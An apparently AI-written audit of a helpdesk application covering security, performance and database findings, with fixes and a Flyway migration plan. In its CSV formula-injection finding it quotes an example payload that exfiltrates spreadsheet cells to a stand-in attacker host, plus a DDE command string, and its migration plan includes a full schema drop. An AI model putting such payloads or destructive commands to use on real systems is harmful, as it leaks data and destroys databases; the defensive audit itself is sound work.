# Konoha HelpDesk — Security, Performance, Dead Code & Database Audit

**Date:** 2026-09-18
**Scope:** `backend/` (200 Java files, ~15.5k lines) and `frontend/src/` (94 files, ~8.9k lines TS/TSX)
**Method:** full read of the security layer, every controller's authorization surface, all repository
queries and entity mappings, a reference-count sweep for dead code, `npm audit` / `npm outdated`, and
CVE lookup against the pinned dependency versions.
**Status:** findings only — **no code has been changed yet.** Pick what you want applied.

---

## Executive summary

The codebase is in better shape than most projects this size. Authentication, token handling, file
upload validation and SQL parameterisation are all done properly, and the September 10 audit's fixes
held. Nothing here is a "your database is on the internet" emergency.

What is worth doing, in order:

1. **Nineteen JPA associations default to EAGER fetching.** This is the single biggest problem in
   the codebase — it quietly multiplies every ticket, user and comment query. (P1)
2. **Password change / reset does not invalidate existing sessions.** A stolen cookie survives the
   password reset meant to kill it, for up to 24 hours. (P1)
3. **The failed-login map grows without bound**, keyed by whatever email a caller sends. (P2)
4. **Every frontend query polls every 15 seconds**, including static reference data. (P2)
5. Thirteen dead methods, four unread config keys, and a handful of missing indexes. (P3)

# 1. Security

## S-1 · HIGH · Password change and reset do not invalidate existing sessions

**Where:** `security/JwtService.java`, `service/auth/AuthService.changePassword`,
`service/auth/AccountService.resetPassword`, `controller/auth/AuthController.logout`

The JWT carries only `sub`, `role`, `iat` and `exp`. `JwtCookieFilter` re-reads the user row on every
request — so a *deactivated* account loses access immediately, which is good — but nothing in the
token or the user row records when the password last changed. Consequences:

- A user who suspects their session was stolen changes their password. The attacker's cookie keeps
  working for the remainder of its 24-hour life (`JWT_EXPIRATION_MS=86400000`).
- The same applies to the forgot-password flow, which exists precisely for the account-takeover case.
- `POST /api/auth/logout` clears the cookie in the browser. It does not revoke the token. Anyone who
  captured the cookie value is unaffected by a logout.

**Fix:** add a `token_version` integer (or `password_changed_at`) column on `users`; put it in the
token as a claim; have `JwtCookieFilter` refuse a token whose claim is behind the row. Increment it
in `changePassword`, `resetPassword`, `activate`, and on forced deactivation. About 25 lines across
four files, plus one column.

## S-2 · MEDIUM · Unbounded failed-login map (memory exhaustion)

**Where:** `security/LoginAttemptService.java`

`attempts` is a `ConcurrentHashMap` keyed by the **email string from the request body** — arbitrary,
attacker-chosen input. Entries are removed only on a successful login for that key, or when
`isLocked()` happens to be called after the lock expired. An entry that never reaches
`max-failed-attempts` (default 5) is never evicted by anything.

`RateLimitFilter` caps a single IP at 10 auth requests/minute, so this is slow, not instant — but
10/min × 60 × 24 = 14,400 new keys per day from one IP, and nothing collects them.

**Fix:** stamp each `Attempt` with `lastSeen` and run the same size-threshold sweep `RateLimitFilter`
already uses, or move to a bounded `Caffeine` cache with `expireAfterWrite(lockMinutes)`. ~10 lines.

## S-3 · MEDIUM · CSV formula injection in both export endpoints

**Where:** `controller/audit/AuditCsvWriter.escape`, `controller/report/ReportCsvWriter.escape`

Both escape correctly for RFC 4180 (quote-wrap when the value contains `,`, `"`, CR or LF). Neither
guards against **spreadsheet formula injection**: a cell whose first character is `=`, `+`, `-`, `@`,
tab or CR is executed as a formula when the file is opened in Excel, LibreOffice or Google Sheets.

The values reaching these files are user-controlled — ticket subjects, company names, audit event
detail strings, engineer names. A customer can name a ticket:

```
=HYPERLINK("https://attacker.example/?x="&A1&A2&A3,"Click for details")
```

…and when an admin exports the audit log and opens it, that row exfiltrates neighbouring cells. Or
worse, `=cmd|'/c calc'!A0` in older Excel configurations.

**Fix:** in `escape()`, prefix any value starting with one of `= + - @ \t \r` with a single quote
(`'`) or a zero-width guard before quoting. Two lines in each writer.

## S-4 · MEDIUM · Spring Boot 4.0.3 is 5 patch releases behind, on a line that is EOL in December

See §5 for detail. **CVE-2026-40976 (CVSS 9.1)** affects 4.0.0–4.0.5. **You are not exploitable** —
it requires an app with no custom `SecurityConfig` that depends on `spring-boot-actuator-autoconfigure`,
and this app has the former and not the latter. But sitting five patches behind a critical advisory
is not a position to hold deliberately.

## S-5 · LOW · Engineers can read any company's pinned templates

**Where:** `service/template/TemplateService.usableFor` (line ~115)

```java
Long scope = staff ? companyId : (actor.getCompany() == null ? null : actor.getCompany().getId());
```

For staff, the client-supplied `companyId` is used **without** `CompanyScope.requireAccess`. Every
other read surface in the app routes through `CompanyScope`. An engineer assigned to companies A and
B can `GET /api/templates/usable?companyId=C` and read the templates pinned to C.

The data at stake is canned reply text, not tickets — hence LOW. But it is an inconsistency in a rule
the rest of the codebase applies uniformly, which is how the *next* gap gets introduced.

**Fix:** one line — `scope.requireAccess(actor, companyId)` when `staff && companyId != null`.

## S-6 · LOW · Profile photos are readable by any authenticated user, across tenants

**Where:** `controller/media/MediaController.get`, `case USER_PHOTO -> { /* any authenticated user */ }`

Documented as intentional ("avatars are visible across the app"). Worth restating as a risk: a
customer at company A who enumerates `/api/media/{uuid}` can retrieve the profile photo of a user at
company B. UUIDs are unguessable, so this needs a leaked id — it is an information-disclosure ceiling,
not an open door. Left as-is is defensible; scoping it to "same company, or staff" costs one lookup.

## S-7 · LOW · Rate limiter is a fixed window and per-IP only

**Where:** `security/RateLimitFilter.java`

- Fixed 60-second windows allow a 2× burst across a boundary (20 login attempts in ~2 seconds
  straddling the minute mark, at a limit of 10).
- Keyed on `request.getRemoteAddr()` only. Per-account lockout (`LoginAttemptService`) is the real
  brute-force defence, so this is a second layer working as intended, but a sliding window or a
  token bucket would be honest about what the config claims.
- Single-instance in-memory — correctly documented in the class comment. Becomes a real hole the day
  this runs behind more than one app instance.

## S-8 · INFO · The CSP protects the API, not the React app

`app.security.headers.content-security-policy = default-src 'none'; frame-ancestors 'none'` is
excellent **for JSON responses from the API**. The React app is served by Vite / a static host, which
sends no CSP at all. Any future XSS in the frontend is unconstrained.

**Fix:** set a CSP at whatever serves `frontend/dist` (nginx, Caddy, the static host's headers file).

## S-9 · INFO · Things that were checked and are correct

Recorded so a future audit does not re-litigate them:

- **SQL/JPQL injection:** none. All six native queries use bind parameters, including the `to_char`
  format string (`cast(:fmt as text)`). `EntityManager.createNativeQuery` in `TemplateCompanyBackfill`
  takes no user input.
- **Password storage:** BCrypt via `PasswordEncoder`, default strength.
- **User enumeration on login:** correctly defeated — a constant `dummyHash` bcrypt comparison runs
  for unknown emails so timing matches, and every failure path returns the same message.
- **One-time tokens:** 256 bits of `SecureRandom`, only SHA-256 stored, single-use, TTL-bounded,
  older tokens invalidated on issue, expired rows purged nightly.
- **File upload:** content type sniffed from magic bytes (never the client's header or extension),
  path built from a server-generated UUID only, size-capped, served through an authenticated
  endpoint with `nosniff` and `Content-Disposition: attachment` for non-images. SVG is not allowed.
- **Error responses:** `GlobalExceptionHandler` plus `server.error.include-*=never` — no stack
  traces, class names or SQL reach the client.
- **Secrets:** `.env` is gitignored and has never been committed (checked `git log --all`). No
  secrets, keys or `.log` files are tracked.
- **CSRF:** disabled, but correctly compensated — `SameSite=Lax` on the auth cookie plus a strict
  CORS origin allow-list, and every state-changing endpoint is POST/PUT/PATCH/DELETE.
- **`npm audit`:** 0 vulnerabilities across 154 packages.
- **Frontend XSS:** no `dangerouslySetInnerHTML`, no `innerHTML`, no `eval`. The only `localStorage`
  use is cosmetic UI preferences. Both `target="_blank"` links carry `rel="noreferrer"`.
- **RBAC:** every controller either carries a class- or method-level `@PreAuthorize`, or delegates to
  `CompanyScope` / `CurrentUser.requireCompanyAccess` in the service. The only gap found is S-5.

# 2. Performance

## P-1 · HIGH · Nineteen associations default to EAGER fetching

**Where:** every `@ManyToOne` / `@OneToOne` in `model/` written without `fetch = FetchType.LAZY`.
JPA's default for `@ManyToOne` and `@OneToOne` is EAGER, and Hibernate obeys it.

The ones that hurt:

| Entity | Field | Consequence |
|---|---|---|
| `User.company` | `@ManyToOne` | Every user load pulls its company |
| `Company.mainEngineer` | `@ManyToOne` | …which pulls a User, which pulls *that* user's company |
| `Ticket.company`, `Ticket.createdBy`, `Ticket.assignee` | all EAGER | Every ticket pulls three graphs |
| `TicketComment.ticket`, `TicketComment.author` | all EAGER | Every comment pulls a ticket and a user |
| `CompanySubscription.company`, `.plan` | `@OneToOne` / `@ManyToOne` | Pulled whenever a subscription is touched |
| `Notification.recipient` | `@ManyToOne` | The bell polls every 10s, 50 rows a page |
| `UserRole.user`, `UserRole.role` | both EAGER | `findByUserId` runs on **every authenticated request** |
| `AccountToken.user`, `EngineerAssignment.*`, `PlanFeature.*`, `CompanySlaConfiguration.company` | EAGER | Smaller, same shape |

`User → Company → mainEngineer(User) → Company` is a cycle. Hibernate terminates it, but the join
tree it builds for a single ticket row is deep, and for a list of 500 tickets it is the dominant cost
of the request. The frontend refetches that list every 15 seconds.

`Role.privileges` is `@ElementCollection(fetch = EAGER)` and `TicketTemplate.companies` is
`@ManyToMany(fetch = EAGER)` — both deliberate and fine at this size.

**Fix:** add `fetch = FetchType.LAZY` to each `@ManyToOne`/`@OneToOne`, then add explicit
`@EntityGraph` or `join fetch` to the queries that genuinely need the association (`TicketService.list`
needs company + assignee; `TicketService.get` needs comments' authors). This is the highest-value
change in the report, and also the one most likely to surface a `LazyInitializationException` in a
DTO mapper — `spring.jpa.open-in-view=false` is already set, which is correct and means any such bug
fails loudly in testing rather than silently N+1-ing in production.

**Recommended rollout:** entity by entity, verifying each DTO mapper, not all nineteen at once.

## P-2 · HIGH · `ContractService.list()` loads every contract and filters in Java

**Where:** `service/contract/ContractService.java:79-96`

```java
List<ServiceContract> matching = contracts.findAllForListing().stream()
    .filter(c -> companyId == null || c.getCompany().getId().equals(companyId))
    .filter(c -> state == null || c.derivedState(...) == state)
    .filter(c -> needle == null || matches(c, needle))
    .toList();
```

Company filter, state filter and free-text search all run in memory over the **entire**
`service_contracts` table. There is no scope pushdown, no limit and no pagination — and the contracts
page polls this every 15 seconds. `derivedState` is computed, so it genuinely cannot be a WHERE
clause; `companyId` and the text search absolutely can.

**Fix:** push `companyId` and the `q` search into a `Specification` (the pattern `AssetService.list`
already uses — it filters columns in Postgres and only applies the computed `warrantyState` in
memory afterwards). Add a row cap like the tickets `LIST_CAP`.

## P-3 · MEDIUM · Every frontend query polls every 15 seconds

**Where:** `frontend/src/App.tsx:42`

```ts
defaultOptions: { queries: { retry: 1, staleTime: 15_000, refetchInterval: 15_000, refetchOnWindowFocus: false } }
```

**45 of the app's 53 `useQuery` calls inherit this default** — only 8 set `refetchInterval` themselves, and one of those (the notification bell) polls *faster*. The ones that should not be polling:

`['plans','all']`, `['features']`, `['subscription-defaults']`, `['roles']`, `['templates']`,
`['companies']` (appears on 8 different pages), `['tickets','assignees']`, `['users','all']`,
`['team', companyId]`, `['company-engineers', companyId]`

An admin idling on the Users page fires three queries every 15 seconds — `users/all`, `companies`,
`roles` — none of which change without that admin's own action, and all of which are already
invalidated by the mutations that change them. On the Companies page, `['companies']` every 15s means
`CompanyService.list()` (three queries plus a user lookup) every 15s, per foreground tab, per user.
(TanStack Query pauses polling for backgrounded tabs, so this is foreground cost only — but the
Companies page is one people leave open.)

**Fix:** flip the default to `refetchInterval: false` and opt *in* the queries that genuinely need
live data — `['tickets', ...]`, `['notifications']`, `['contracts', ...]`, the asset and dashboard
counts. Roughly ten one-line additions, and it removes ~70% of the app's idle request volume.

## P-4 · MEDIUM · `CompanyScope.visibleCompanies` loads every company and filters in memory

**Where:** `service/company/CompanyScope.java:85`

```java
return companies.findAll().stream().filter(c -> scope == null || scope.contains(c.getId()))...
```

Called by `AssetService.companiesWithCounts` (the assets landing page) and others. The class comment
explains why `visibleCompanyIds` returns `null` instead of materialising every id — to avoid exactly
this scan — and then `visibleCompanies` does the scan anyway.

**Fix:** `scope == null ? companies.findAll(Sort.by("name")) : companies.findAllById(scope)` — or add a
`findAllByOrderByNameAsc()` to `CompanyRepository` (it does not exist yet) and branch on that.

## P-5 · MEDIUM · `PlanService.list()` N+1 (carried over from 2026-09-10)

Per plan: `featuresOf` + `slaOf` + `featureService.allFeatures()` — roughly 3-4 queries each, and
`allFeatures()` hits the database once per plan. Bounded by plan count (a handful), so the impact is
small — but `/api/admin/plans` is one of the queries polling every 15 seconds under P-3, and fixing
P-3 removes most of the cost for free.

**Fix if you want it properly:** `@Cacheable` on `FeatureService.allFeatures()`, or hoist it out of
the loop and pass it in.

## P-6 · LOW · `UserRoleRepository.findByUserId` runs on every authenticated request

**Where:** `security/JwtCookieFilter.authoritiesFor`

Every request: one query for the user, one for their `user_roles`, plus the EAGER `role` and the
EAGER `role.privileges` element collection per row (P-1). For a user with no custom roles that is
2-3 queries before any controller code runs.

**Fix:** either fold the roles into the user query with an `@EntityGraph`, or skip the lookup
entirely when the user has no rows (a `boolean hasAdditionalRoles` column, or a short-lived cache).
Only worth doing after P-1 — most of the cost is the EAGER privileges collection.

## P-7 · LOW · `EngineerAssignmentService` calls `findAll()` twice

`engineersByCompany()` and `companiesByEngineer()` (lines 76, 83) both load the entire
`engineer_assignments` table and group in memory. Correct at current scale — flagged so it is on the
list if that table ever grows.

# 4. Database

Current setup: Postgres, `spring.jpa.hibernate.ddl-auto=update`, with two hand-written
`ApplicationRunner` migrations (`EmailUniqueIndexMigration`, `TemplateCompanyBackfill`) patching what
`update` cannot do. That is the right instinct and the wrong mechanism — `update` only ever adds; it
never drops a column, narrows a type, or removes an index, so the schema slowly diverges from the
entities with no record of why.

**Agreed direction: Flyway.** Plan in §6.

## D-1 · HIGH · `uq_users_email_active` cannot serve the login lookup

**Where:** `config/EmailUniqueIndexMigration.java` vs `repository/user/UserRepository.java:18`

The index is:

```sql
CREATE UNIQUE INDEX uq_users_email_active ON users (email) WHERE status <> 'IS_DELETED';
```

The login path calls `findByEmailIgnoreCaseAndStatusNot`, which Hibernate renders as
`where lower(u.email) = lower(?) and u.status <> ?`. **An index on `email` cannot answer a predicate
on `lower(email)`** — Postgres will sequential-scan `users` on every single login attempt, and on
every duplicate check in `existsByEmailIgnoreCaseAndStatusNot`.

Second-order problem: the uniqueness is case-*sensitive*, so `Bob@x.com` and `bob@x.com` can both
exist as live rows, while the application's duplicate checks are case-*insensitive*. Today
`TeamService` and `UserService` lowercase before saving, so it doesn't bite — but the constraint and
the code disagree about what "the same email" means, which is a bug waiting for one missed
`.toLowerCase()`.

**Fix:**

```sql
DROP INDEX IF EXISTS uq_users_email_active;
CREATE UNIQUE INDEX uq_users_email_active ON users (lower(email)) WHERE status <> 'IS_DELETED';
```

## D-2 · MEDIUM · Missing indexes on foreign keys and hot filters

Postgres does **not** auto-index foreign keys. Missing, in rough priority:

| Table | Column(s) | Why |
|---|---|---|
| `tickets` | `(company_id, status)` | `countOpenByCompany` and the list Specification filter both. Two single-column indexes exist; the composite lets one index answer the query |
| `engineer_assignments` | `company_id` | `findByCompanyId` / `deleteByCompanyId`. The unique constraint is `(engineer_id, company_id)`, so only `engineer_id` is served |
| `user_roles` | `role_id` | `deleteByRoleId` + the FK. `uk_user_role` leads with `user_id` |
| `company_subscriptions` | `plan_id` | `existsByPlanId` + the FK; checked before a plan is deleted |
| `tickets` | `created_by` | FK with no index |
| `ticket_comments` | `author_id` | FK with no index |
| `companies` | `main_engineer_id` | FK with no index |
| `contract_visits` | `ticket_id`, `completed_by` | FKs with no index |

An unindexed FK means every `DELETE` on the parent scans the child table to check the constraint —
which is exactly what happens when an admin deletes a role or removes a user.

## D-3 · MEDIUM · Partial index for the SLA breach sweep

`TicketRepository.findSlaBreachCandidates` runs every 5 minutes (`app.sla.check-interval-ms=300000`)
and scans for open tickets past a deadline with the breach not yet recorded. It is a small, highly
selective slice of a table that only grows:

```sql
CREATE INDEX ix_tickets_sla_sweep ON tickets (response_due_at, resolution_due_at)
WHERE status IN ('OPEN','IN_PROGRESS')
  AND (response_breached_at IS NULL OR resolution_breached_at IS NULL);
```

## D-4 · MEDIUM · `audit_events` grows forever and its query pattern isn't indexed for

Retention is 365 days (`app.audit.retention-days`) with a nightly prune, so it is bounded — but a
year of events on an active system is a lot of rows, and the viewer filters on
`action` / `level` / `actor` **and** orders by `created_at DESC`. Existing indexes are three separate
single-column ones. Add `(action, created_at DESC)` and an index on `level`, and consider
`(created_at DESC)` explicitly for the default unfiltered view.

## D-5 · LOW · `run.log` (21 KB) sits in `backend/`

Gitignored, so it is not in history — but it is a runtime log in a source directory. Move it to a
`logs/` folder or point logging at a path outside the repo.

## D-6 · INFO · Schema strengths worth keeping

Indexing is already thought about — `assets`, `tickets`, `notifications`, `audit_events`,
`account_tokens`, `media_files`, `contract_visits` and `service_contracts` all carry deliberate
`@Index` declarations, and unique constraints are in place on every natural key
(`plans.plan_name`, `features.feature_code`, `roles.name`, `users.user_code`,
`uk_engineer_company`, `uk_user_role`, `uq_business_hours_company_day`). This is not a schema that
needs rebuilding — it needs the gaps filled and a migration tool put in front of it.

# 6. Proposed Flyway migration plan

You said there is no important data, which makes this straightforward.

**Step 1 — add Flyway**

```xml
<dependency>
  <groupId>org.flywaydb</groupId>
  <artifactId>flyway-core</artifactId>
</dependency>
<dependency>
  <groupId>org.flywaydb</groupId>
  <artifactId>flyway-database-postgresql</artifactId>
</dependency>
```

(Version managed by the Boot parent.)

**Step 2 — generate the V1 baseline from the entities.** The sandbox has no JDK and cannot reach
Maven Central, so I cannot run Hibernate's schema exporter for you. One command on your machine
produces the exact DDL Hibernate would create, which is the safest possible baseline:

```
cd backend
mvnw.cmd spring-boot:run "-Dspring-boot.run.jvmArguments=-Dspring.jpa.properties.jakarta.persistence.schema-generation.scripts.action=create -Dspring.jpa.properties.jakarta.persistence.schema-generation.scripts.create-target=schema.sql"
```

Send me `backend/schema.sql` and I turn it into `V1__baseline.sql`. (If you would rather not run it,
I can hand-write V1 from the 25 entity classes — it is accurate but slower and I would want you to
diff it against a fresh `ddl-auto=create` run before trusting it.)

**Step 3 — `V2__indexes_and_constraints.sql`**, containing everything in §4:

- `lower(email)` functional unique index replacing `uq_users_email_active` (D-1)
- the eight missing FK / composite indexes (D-2)
- the SLA sweep partial index (D-3)
- the two `audit_events` indexes (D-4)

**Step 4 — `V3__token_version.sql`** if you take S-1: `ALTER TABLE users ADD COLUMN token_version INTEGER NOT NULL DEFAULT 0;`

**Step 5 — retire the runtime patchers.** `EmailUniqueIndexMigration` and `TemplateCompanyBackfill`
become `V1`/`V2` content and their `ApplicationRunner` classes get deleted. Both currently run on
every single startup.

**Step 6 — flip the switch:**

```properties
spring.jpa.hibernate.ddl-auto=${DDL_AUTO:validate}
spring.flyway.enabled=true
spring.flyway.baseline-on-migrate=false
```

`validate` means the app refuses to start if the schema and the entities disagree — which is the
whole point, and the thing `update` can never tell you.

**Step 7 — rebuild clean.** `DROP SCHEMA public CASCADE; CREATE SCHEMA public;` then start the app
and let Flyway build it from V1. The seeders (`SubscriptionSeeder`, `RoleSeeder`, `AdminBootstrap`)
repopulate plans, roles and the first admin on boot.
